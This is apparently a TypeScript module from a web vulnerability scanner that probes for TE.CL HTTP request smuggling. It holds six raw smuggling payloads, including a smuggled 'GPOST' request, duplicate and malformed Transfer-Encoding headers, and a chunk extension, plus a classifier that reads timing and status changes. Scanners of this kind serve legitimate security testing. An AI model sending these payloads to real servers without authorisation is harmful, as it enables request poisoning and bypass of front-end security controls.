// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'request-smuggling-te-cl',
  family: 'request-smuggling',
  title: 'HTTP request smuggling — TE.CL',
  severity: 'critical',
  destructiveRisk: 'low',
  requiresOast: false,
  requiresBrowser: false,
  insertionPointKinds: ['header', 'body'],
  expectedSignals: ['timeout-delta', 'extra-response', 'status-delta'],
  cwe: [444],
};

export function variants(_ctx: ProbeContext): PayloadVariant[] {
  return [
    {
      id: 'smug-te-cl-basic',
      family: 'request-smuggling',
      value: 'Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: legit.example\r\nContent-Length: 10\r\n\r\n0\r\n\r\n',
      encoding: 'raw',
      intent: 'TE.CL: front-end uses TE chunked, back-end uses CL — smuggled prefix GPOST',
      destructiveRisk: 'low',
      expectedSignals: ['extra-response', 'status-delta'],
    },
    {
      id: 'smug-te-cl-time-probe',
      family: 'request-smuggling',
      value: 'Transfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\n',
      encoding: 'raw',
      intent: 'TE.CL timing probe: CL longer than actual body causes back-end wait',
      destructiveRisk: 'none',
      expectedSignals: ['timeout-delta'],
    },
    {
      id: 'smug-te-cl-obfuscated',
      family: 'request-smuggling',
      value: 'Transfer-Encoding: chunked\r\nTransfer-encoding: identity\r\nContent-Length: 3\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: legit.example\r\nContent-Length: 10\r\n\r\n0\r\n\r\n',
      encoding: 'raw',
      intent: 'TE.CL with duplicate TE headers (chunked + identity) to confuse front-end',
      destructiveRisk: 'low',
      expectedSignals: ['extra-response', 'status-delta'],
    },
    {
      id: 'smug-te-cl-nl-header',
      family: 'request-smuggling',
      value: 'Transfer-Encoding:\nchunked\r\nContent-Length: 3\r\n\r\n5\r\nHELLO\r\n0\r\n\r\n',
      encoding: 'raw',
      intent: 'TE.CL with LF-only header line to bypass front-end TE parsing',
      destructiveRisk: 'low',
      expectedSignals: ['timeout-delta', 'extra-response'],
    },
    {
      id: 'smug-te-cl-space',
      family: 'request-smuggling',
      value: ' Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n5\r\nHELLO\r\n0\r\n\r\n',
      encoding: 'raw',
      intent: 'TE.CL with leading space on TE header (RFC non-compliant parsing bypass)',
      destructiveRisk: 'low',
      expectedSignals: ['extra-response'],
    },
    {
      id: 'smug-te-cl-chunk-ext',
      family: 'request-smuggling',
      value: 'Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n5;ext=value\r\nHELLO\r\n0\r\n\r\n',
      encoding: 'raw',
      intent: 'TE.CL with chunk extension to bypass extension-unaware back-ends',
      destructiveRisk: 'low',
      expectedSignals: ['extra-response', 'status-delta'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const timingDelta = resp.responseTimeMs - baseline.responseTimeMs;

  if (timingDelta > 4000) {
    responseClass = 'timing-delta';
    confidence = 0.75;
    nextAction = 'confirm';
    evidence.push(`TE.CL timing delta ${timingDelta}ms — back-end waiting for additional CL bytes`);
  } else if (resp.statusCode === 400 || resp.statusCode === 501) {
    responseClass = 'method-or-parser-rejected';
    confidence = 0.65;
    nextAction = 'stop-negative';
    evidence.push(`${resp.statusCode} — TE rejected by this server`);
  } else if (resp.statusCode !== baseline.statusCode) {
    responseClass = 'status-delta';
    confidence = 0.55;
    nextAction = 'confirm';
    evidence.push(`Status delta ${baseline.statusCode}→${resp.statusCode} for ${variant.id}`);
  } else {
    nextAction = 'continue';
    evidence.push('No TE.CL signal detected for this variant');
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
